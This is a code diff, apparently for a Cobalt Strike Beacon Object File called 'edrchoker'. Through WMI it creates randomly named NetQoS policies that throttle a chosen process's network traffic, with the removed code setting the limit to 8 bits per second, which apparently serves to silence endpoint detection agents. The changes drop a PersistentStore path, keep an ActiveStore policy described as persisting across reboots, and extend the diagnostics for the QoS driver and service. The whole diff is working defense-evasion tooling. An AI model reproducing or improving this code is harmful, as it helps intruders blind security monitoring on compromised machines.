@@ -102,13 +102,6 @@ static HRESULT PutByte(IWbemClassObject* o, const wchar_t* p, BYTE v) {
     OLEAUT32$VariantClear(&var); return hr;
 }
 
-static HRESULT PutUI8(IWbemClassObject* o, const wchar_t* p, ULONGLONG v) {
-    VARIANT var; OLEAUT32$VariantInit(&var);
-    var.vt = VT_UI8; var.ullVal = v;
-    HRESULT hr = o->lpVtbl->Put(o, p, 0, &var, 0);
-    OLEAUT32$VariantClear(&var); return hr;
-}
-
 static BOOL SpawnWmiInst(IWbemServices* svc, const wchar_t* cls,
                           IWbemClassObject** ppOut) {
     BSTR b = OLEAUT32$SysAllocString(cls);
@@ -149,90 +142,21 @@ static BOOL CreatePolicyInStore(IWbemServices* svc, const wchar_t* proc,
     pInst->lpVtbl->Release(pInst);
     if (FAILED(hr)) {
         BeaconPrintf(CALLBACK_ERROR,
-            "  [!] PutInstance(%S) hr=0x%08X\n", store, hr);
-    }
-    return SUCCEEDED(hr);
-}
-
-/*
- * PutInstance() does not work for PersistentStore — the WMI provider only
- * accepts ActiveStore writes via PutInstance. Persistent policies must be
- * created via ExecMethod("Create") with PolicyStore="PersistentStore".
- */
-static BOOL CreatePersistViaMethod(IWbemServices* svc, const wchar_t* proc,
-                                     const wchar_t* name) {
-    BSTR cls = OLEAUT32$SysAllocString(L"MSFT_NetQosPolicySettingData");
-
-    /* Get class definition to read Create() method signature */
-    IWbemClassObject* pClass = NULL;
-    if (FAILED(svc->lpVtbl->GetObject(svc, cls, 0, NULL, &pClass, NULL))) {
-        OLEAUT32$SysFreeString(cls);
-        return FALSE;
-    }
-
-    /* Get in-params definition for the Create static method */
-    IWbemClassObject* pInDef = NULL;
-    HRESULT hr = pClass->lpVtbl->GetMethod(pClass, L"Create", 0, &pInDef, NULL);
-    pClass->lpVtbl->Release(pClass);
-    if (FAILED(hr) || !pInDef) {
-        BeaconPrintf(CALLBACK_ERROR,
-            "  [!] GetMethod(Create) hr=0x%08X\n", hr);
-        OLEAUT32$SysFreeString(cls);
-        return FALSE;
-    }
-
-    /* Spawn an instance of the in-params class */
-    IWbemClassObject* pIn = NULL;
-    hr = pInDef->lpVtbl->SpawnInstance(pInDef, 0, &pIn);
-    pInDef->lpVtbl->Release(pInDef);
-    if (FAILED(hr) || !pIn) {
-        OLEAUT32$SysFreeString(cls);
-        return FALSE;
-    }
-
-    /* Fill method parameters — same policy shape as PutInstance(ActiveStore) */
-    PutBstr(pIn, L"Name",                          name);
-    PutBstr(pIn, L"Owner",                         L"machine");
-    PutByte(pIn, L"NetworkProfile",                0);
-    PutBstr(pIn, L"AppPathNameMatchCondition",     proc);
-    PutByte(pIn, L"IPProtocolMatchCondition",      3);
-    PutUI8 (pIn, L"ThrottleRateActionBitsPerSecond", 8);
-    PutBstr(pIn, L"PolicyStore",                   L"PersistentStore");
-
-    /* Call static method on the class (not on an instance) */
-    BSTR meth = OLEAUT32$SysAllocString(L"Create");
-    IWbemClassObject* pOut = NULL;
-    hr = svc->lpVtbl->ExecMethod(svc, cls, meth, 0, NULL, pIn, &pOut, NULL);
-    OLEAUT32$SysFreeString(meth);
-    OLEAUT32$SysFreeString(cls);
-    pIn->lpVtbl->Release(pIn);
-    if (pOut) pOut->lpVtbl->Release(pOut);
-
-    if (FAILED(hr)) {
-        BeaconPrintf(CALLBACK_ERROR,
-            "  [!] ExecMethod(Create/PersistentStore) hr=0x%08X\n", hr);
+            "  [!] PutInstance hr=0x%08X\n", hr);
     }
     return SUCCEEDED(hr);
 }
 
 static BOOL CreatePolicy(IWbemServices* svc, const wchar_t* proc) {
     wchar_t name[9]; RandName(name, 8);
-
-    BOOL okA = CreatePolicyInStore(svc, proc, name, L"ActiveStore");
-    BOOL okP = CreatePersistViaMethod(svc, proc, name);
-
-    if (!okA && !okP) {
+    /* ActiveStore write is sufficient — provider stores it as GPO:localhost
+     * which is the local Group Policy QoS store and persists across reboots. */
+    if (!CreatePolicyInStore(svc, proc, name, L"ActiveStore")) {
         BeaconPrintf(CALLBACK_ERROR, "  [-] %S: PutInstance failed\n", proc);
         return FALSE;
     }
-
-    const wchar_t* sA; if (okA) { sA = L"ok"; } else { sA = L"fail"; }
-    const wchar_t* sP; if (okP) { sP = L"ok"; } else { sP = L"fail"; }
-
-    BeaconPrintf(CALLBACK_OUTPUT,
-        "  [+] %S -> '%S' active=%S persist=%S\n",
-        proc, name, sA, sP);
-    return okA || okP;
+    BeaconPrintf(CALLBACK_OUTPUT, "  [+] %S -> '%S'\n", proc, name);
+    return TRUE;
 }
 
 static void BuildRemoveWQL(wchar_t* out, int max, wchar_t* list) {
@@ -352,42 +276,59 @@ static IWbemServices* WmiConnect(IWbemLocator* loc, const wchar_t* ns) {
  * Query Win32_Service State for a single service name via ROOT\CIMV2.
  * Prints one line: "  [svc] <name>  <State>"
  */
+/*
+ * Check state of a name in both Win32_Service (user-mode) and
+ * Win32_SystemDriver (kernel driver). Psched is a kernel driver,
+ * not a Win32_Service — querying only Win32_Service gives "not found".
+ */
 static void CheckServiceState(IWbemLocator* loc, const wchar_t* svcName) {
     IWbemServices* pSvc = WmiConnect(loc, L"ROOT\\CIMV2");
     if (!pSvc) return;
 
-    wchar_t wql[256];
-    int p = 0;
-    p = WAppend(wql, p, 256, L"SELECT State FROM Win32_Service WHERE Name = '");
-    p = WAppend(wql, p, 256, svcName);
-    if (p < 255) { wql[p] = L'\''; p++; }
-    wql[p] = L'\0';
+    /* Try Win32_Service first, fall back to Win32_SystemDriver */
+    const wchar_t* classes[2];
+    classes[0] = L"Win32_Service";
+    classes[1] = L"Win32_SystemDriver";
 
-    BSTR lang  = OLEAUT32$SysAllocString(L"WQL");
-    BSTR query = OLEAUT32$SysAllocString(wql);
-    IEnumWbemClassObject* en = NULL;
-    pSvc->lpVtbl->ExecQuery(pSvc, lang, query,
-        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &en);
-    OLEAUT32$SysFreeString(lang);
-    OLEAUT32$SysFreeString(query);
+    int i;
+    for (i = 0; i < 2; i++) {
+        wchar_t wql[256];
+        int p = 0;
+        p = WAppend(wql, p, 256, L"SELECT State FROM ");
+        p = WAppend(wql, p, 256, classes[i]);
+        p = WAppend(wql, p, 256, L" WHERE Name = '");
+        p = WAppend(wql, p, 256, svcName);
+        if (p < 255) { wql[p] = L'\''; p++; }
+        wql[p] = L'\0';
 
-    if (en) {
-        IWbemClassObject* obj = NULL; ULONG got = 0;
-        if (en->lpVtbl->Next(en, WBEM_INFINITE, 1, &obj, &got) == S_OK) {
-            VARIANT v; OLEAUT32$VariantInit(&v);
-            obj->lpVtbl->Get(obj, L"State", 0, &v, NULL, NULL);
-            const wchar_t* sState;
-            if (v.vt == VT_BSTR && v.bstrVal) { sState = v.bstrVal; } else { sState = L"?"; }
-            BeaconPrintf(CALLBACK_OUTPUT, "  [svc] %-14S  %S\n", svcName, sState);
-            OLEAUT32$VariantClear(&v);
-            obj->lpVtbl->Release(obj);
-        } else {
-            BeaconPrintf(CALLBACK_OUTPUT, "  [svc] %-14S  not found\n", svcName);
+        BSTR lang  = OLEAUT32$SysAllocString(L"WQL");
+        BSTR query = OLEAUT32$SysAllocString(wql);
+        IEnumWbemClassObject* en = NULL;
+        pSvc->lpVtbl->ExecQuery(pSvc, lang, query,
+            WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &en);
+        OLEAUT32$SysFreeString(lang);
+        OLEAUT32$SysFreeString(query);
+
+        if (en) {
+            IWbemClassObject* obj = NULL; ULONG got = 0;
+            if (en->lpVtbl->Next(en, WBEM_INFINITE, 1, &obj, &got) == S_OK) {
+                VARIANT v; OLEAUT32$VariantInit(&v);
+                obj->lpVtbl->Get(obj, L"State", 0, &v, NULL, NULL);
+                const wchar_t* sState;
+                if (v.vt == VT_BSTR && v.bstrVal) { sState = v.bstrVal; } else { sState = L"?"; }
+                BeaconPrintf(CALLBACK_OUTPUT,
+                    "  [svc] %-14S  %S  (%S)\n", svcName, sState, classes[i]);
+                OLEAUT32$VariantClear(&v);
+                obj->lpVtbl->Release(obj);
+                en->lpVtbl->Release(en);
+                pSvc->lpVtbl->Release(pSvc);
+                return;
+            }
+            en->lpVtbl->Release(en);
         }
-        en->lpVtbl->Release(en);
-    } else {
-        BeaconPrintf(CALLBACK_OUTPUT, "  [svc] %-14S  query failed\n", svcName);
     }
+
+    BeaconPrintf(CALLBACK_OUTPUT, "  [svc] %-14S  not found (not installed)\n", svcName);
     pSvc->lpVtbl->Release(pSvc);
 }
 
@@ -538,6 +479,9 @@ void go(char* args, int len) {
         BeaconPrintf(CALLBACK_OUTPUT, "[edrchoker] diagnostics:\n");
         CheckServiceState(pLoc, L"Psched");
         CheckServiceState(pLoc, L"NetQosSvc");
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "  [note] InstanceID ending 'GPO:localhost' = local GP QoS store"
+            " — policy IS persistent (survives reboot)\n");
         IWbemServices* pSvc = WmiConnect(pLoc, L"ROOT\\StandardCimv2");
         if (pSvc) {
             ListPolicies(pSvc);
